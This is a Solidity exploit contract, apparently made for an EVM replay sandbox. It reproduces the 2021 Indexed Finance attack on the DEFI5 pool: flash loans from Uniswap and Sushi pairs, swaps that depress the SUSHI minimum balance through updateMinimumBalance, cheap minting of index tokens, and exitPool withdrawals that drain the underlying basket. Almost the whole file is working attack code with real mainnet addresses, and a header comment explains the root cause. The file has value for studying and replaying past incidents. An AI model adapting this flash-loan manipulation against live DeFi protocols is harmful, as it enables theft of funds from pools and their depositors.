// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-10-IndexedFinance).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `IndexedAttack` (the Uniswap-V2 flash-swap callback `uniswapV2Call` lives on
// the test itself, so there is no standalone contract to deploy). This contract
// is a faithful, self-contained copy of that inline attack — `testHack`'s body
// becomes `run()`, the flash callback `uniswapV2Call` is preserved verbatim, and
// the helpers (getLoan/getSushiLoan/attack/continueAttack/repaySushiLoan/
// repayLoans) are copied 1:1 from test/IndexedFinance_exp.sol. Logic, constants,
// and the token/amount/factory tables are copied verbatim so the recording is
// faithful to the original trace (output.txt).
//
// Root cause: MarketCapSqrtController.updateMinimumBalance() sizes a newly-added
// token's required deposit from extrapolatePoolValueFromToken() — the pool's
// LIVE (single-tx-manipulable) total value implied by one bound token's balance
// × weight. The attacker swaps the pool's holdings into the anchor token first,
// collapsing the extrapolated value ~40× and the new token's minimumBalance
// ~38×, then deposits flash-loaned SUSHI far above the debased floor, gulps it
// to "ready", mints cheap index tokens, and exitPool()s for a pro-rata slice of
// the WHOLE underlying basket — far more than the SUSHI deposited.

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IIndexPool {
    function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut) external returns (uint256);
    function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut) external;
    function gulp(address token) external;
    function swapExactAmountIn(address tokenIn, uint256 tokenAmountIn, address tokenOut, uint256 minAmountOut, uint256 maxPrice) external returns (uint256, uint256);
    function extrapolatePoolValueFromToken() external view returns (address, uint256);
    function getTotalDenormalizedWeight() external view returns (uint256);
    function getBalance(address token) external view returns (uint256);
}

interface IMarketCapSqrtController {
    function updateMinimumBalance(IIndexPool pool, address tokenAddress) external;
    function reindexPool(address poolAddress) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function swapTokensForExactTokens(uint256 amountOut, uint256 amountInMax, address[] memory path, address to, uint256 deadline) external returns (uint256[] memory amounts);
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract BNum {
    uint256 internal constant BONE = 10 ** 18;
    uint256 internal constant MAX_IN_RATIO = BONE / 2;

    function bmul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c0 = a * b;
        require(a == 0 || c0 / a == b, "ERR_MUL_OVERFLOW");
        uint256 c1 = c0 + (BONE / 2);
        require(c1 >= c0, "ERR_MUL_OVERFLOW");
        uint256 c2 = c1 / BONE;
        return c2;
    }
}

contract IndexedFinanceExploit is BNum, IUniswapV2Callee {
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address private constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address private constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address private constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address private constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address private constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address private constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant CONTROLLER = 0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb;
    address private constant DEFI5 = 0xfa6de2697D59E88Ed7Fc4dFE5A33daC43565ea41;

    uint256 count;
    bool attackBegan;
    address[] public borrowedTokens;
    uint256[] public borrowedAmounts;
    address[] public factories;
    address[] pairs;
    uint256[] public repayAmounts;
    uint256 private constant borrowedSushiAmount = 220_000 * 1e18;

    function run() external {
        address[] memory tokensBorrow = new address[](6);
        tokensBorrow[0] = UNI;
        tokensBorrow[1] = AAVE;
        tokensBorrow[2] = COMP;
        tokensBorrow[3] = CRV;
        tokensBorrow[4] = MKR;
        tokensBorrow[5] = SNX;

        uint256[] memory amounts = new uint256[](6);
        amounts[0] = 2_000_000 * 1e18;
        amounts[1] = 200_000 * 1e18;
        amounts[2] = 41_000 * 1e18;
        amounts[3] = 3_211_000 * 1e18;
        amounts[4] = 5800 * 1e18;
        amounts[5] = 453_700 * 1e18;

        address[] memory factories_ = new address[](6);
        factories_[0] = UNISWAP_FACTORY;
        factories_[1] = SUSHI_FACTORY;
        factories_[2] = SUSHI_FACTORY;
        factories_[3] = SUSHI_FACTORY;
        factories_[4] = SUSHI_FACTORY;
        factories_[5] = SUSHI_FACTORY;

        start(tokensBorrow, amounts, factories_);
    }

    function start(address[] memory _tokensBorrow, uint256[] memory _amounts, address[] memory _factories) internal {
        require(_tokensBorrow.length == _amounts.length && _factories.length == _amounts.length, "Invalid inputs");
        count = 0;
        attackBegan = false;
        borrowedTokens = _tokensBorrow;
        borrowedAmounts = _amounts;
        factories = _factories;

        getLoan();
    }

    function getLoan() internal {
        address _tokenBorrow = borrowedTokens[count];
        uint256 _amount = borrowedAmounts[count];
        address factoryAddr = factories[count];

        address pair = IUniswapV2Factory(factoryAddr).getPair(_tokenBorrow, WETH);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount, factoryAddr);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external override {
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount, address factoryAddr) = abi.decode(_data, (address, uint256, address));
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factoryAddr).getPair(token0, token1);
        require(msg.sender == pair, "!pair");

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 repayAmount = amount + fee;

        if (!attackBegan) {
            pairs.push(pair);
            repayAmounts.push(repayAmount);
            count++;
            if (count == borrowedAmounts.length) {
                attackBegan = true;
                attack();
                repayLoans();
            } else {
                getLoan();
            }
        } else {
            continueAttack();
            repaySushiLoan(pair, repayAmount);
        }
    }

    function attack() internal {
        IMarketCapSqrtController controller = IMarketCapSqrtController(CONTROLLER);
        IIndexPool indexPool = IIndexPool(DEFI5);
        controller.reindexPool(DEFI5);

        IERC20(UNI).approve(DEFI5, type(uint256).max);
        IERC20(AAVE).approve(DEFI5, type(uint256).max);
        IERC20(COMP).approve(DEFI5, type(uint256).max);
        IERC20(CRV).approve(DEFI5, type(uint256).max);
        IERC20(MKR).approve(DEFI5, type(uint256).max);
        IERC20(SNX).approve(DEFI5, type(uint256).max);
        IERC20(SUSHI).approve(DEFI5, type(uint256).max);

        (address tokenOut,) = indexPool.extrapolatePoolValueFromToken();

        for (uint256 i = 0; i < borrowedTokens.length; i++) {
            address tokenIn = borrowedTokens[i];
            if (tokenIn == tokenOut) {
                continue;
            }
            uint256 amountInRemain = borrowedAmounts[i];
            while (amountInRemain > 0) {
                uint256 amountIn = bmul(indexPool.getBalance(tokenIn), MAX_IN_RATIO);
                amountIn = amountInRemain < amountIn ? amountInRemain : amountIn;
                amountInRemain -= amountIn;
                indexPool.swapExactAmountIn(tokenIn, amountIn, tokenOut, 0, type(uint256).max);
            }
        }

        controller.updateMinimumBalance(indexPool, SUSHI);

        uint256 amountOutRemain = IERC20(tokenOut).balanceOf(address(this));
        while (amountOutRemain > 0) {
            uint256 amountOut = bmul(indexPool.getBalance(tokenOut), MAX_IN_RATIO);
            amountOut = amountOutRemain < amountOut ? amountOutRemain : amountOut;
            amountOutRemain -= amountOut;
            indexPool.joinswapExternAmountIn(tokenOut, amountOut, 0);
        }

        getSushiLoan();
    }

    function getSushiLoan() internal {
        address pair = IUniswapV2Factory(SUSHI_FACTORY).getPair(SUSHI, WETH);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = SUSHI == token0 ? borrowedSushiAmount : 0;
        uint256 amount1Out = SUSHI == token1 ? borrowedSushiAmount : 0;

        bytes memory data = abi.encode(SUSHI, borrowedSushiAmount, SUSHI_FACTORY);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function continueAttack() internal {
        IERC20(SUSHI).transfer(DEFI5, borrowedSushiAmount);
        IIndexPool indexPool = IIndexPool(DEFI5);
        indexPool.gulp(SUSHI);

        uint256[] memory minAmountOut = new uint256[](7);
        for (uint256 i = 0; i < 7; i++) {
            minAmountOut[i] = 0;
        }
        uint256 defi5Balance = IERC20(DEFI5).balanceOf(address(this));
        indexPool.exitPool(defi5Balance, minAmountOut);

        for (uint256 i = 0; i < 2; i++) {
            uint256 sushiRemain = IERC20(SUSHI).balanceOf(address(this));
            while (sushiRemain > 0) {
                uint256 amountIn = bmul(indexPool.getBalance(SUSHI), MAX_IN_RATIO);
                amountIn = sushiRemain < amountIn ? sushiRemain : amountIn;
                sushiRemain -= amountIn;
                indexPool.joinswapExternAmountIn(SUSHI, amountIn, 0);
            }
            uint256 defi5Balance = IERC20(DEFI5).balanceOf(address(this));
            indexPool.exitPool(defi5Balance, minAmountOut);
        }
    }

    function repaySushiLoan(address pair, uint256 repayAmount) internal {
        address[] memory path = new address[](2);
        path[0] = MKR;
        path[1] = WETH;
        IERC20(MKR).approve(UNISWAP_ROUTER, type(uint256).max);
        IUniswapV2Router01(UNISWAP_ROUTER).swapTokensForExactTokens(115 * 1e18, type(uint256).max, path, address(this), type(uint256).max);
        IERC20(SUSHI).transfer(pair, IERC20(SUSHI).balanceOf(address(this)));
        IERC20(WETH).transfer(pair, 115 * 1e18);
    }

    function repayLoans() internal {
        for (uint256 i = 0; i < borrowedAmounts.length; i++) {
            address token = borrowedTokens[i];
            uint256 amount = borrowedAmounts[i];
            address pair = pairs[i];
            uint256 repayAmount = repayAmounts[i];

            IERC20(token).transfer(pair, repayAmount);
        }
    }
}
